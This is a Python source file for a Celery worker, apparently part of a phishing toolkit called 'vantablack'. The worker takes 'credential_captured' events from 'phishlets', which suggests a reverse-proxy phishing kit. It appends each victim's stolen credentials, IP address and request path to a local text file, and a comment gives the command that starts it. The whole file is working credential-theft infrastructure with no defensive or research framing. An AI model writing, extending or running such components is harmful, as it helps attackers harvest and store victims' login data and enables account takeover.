import logging

from core.event_bus import app

# Configure logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger("VantaWorker")

@app.task(name='vantablack.events.credential_captured')
def handle_credential_captured(data: dict):
    """
    Handles the 'credential_captured' event.
    This worker's job is to save the captured credentials to a file.
    """
    try:
        phishlet_name = data.get('phishlet_name', 'Unknown')
        path = data.get('path', '/')
        captured_data = data.get('captured_data', {})
        request_info = data.get('request_info', {})
        timestamp = data.get('timestamp', '')

        log_msg = f"[WORKER] Received credential_captured event for {phishlet_name}. Saving to file..."
        logger.info(log_msg)
        print(log_msg)

        # Save to file
        with open("captured_credentials.txt", "a") as f:
            f.write(f"[{timestamp}][{phishlet_name}] IP: {request_info.get('client_ip')} | Path: {path} | Data: {captured_data}\n")

    except Exception as e:
        logger.error(f"[WORKER] Error handling credential_captured event: {e}")

# To run this worker:
# celery -A workers.event_handlers worker --loglevel=info
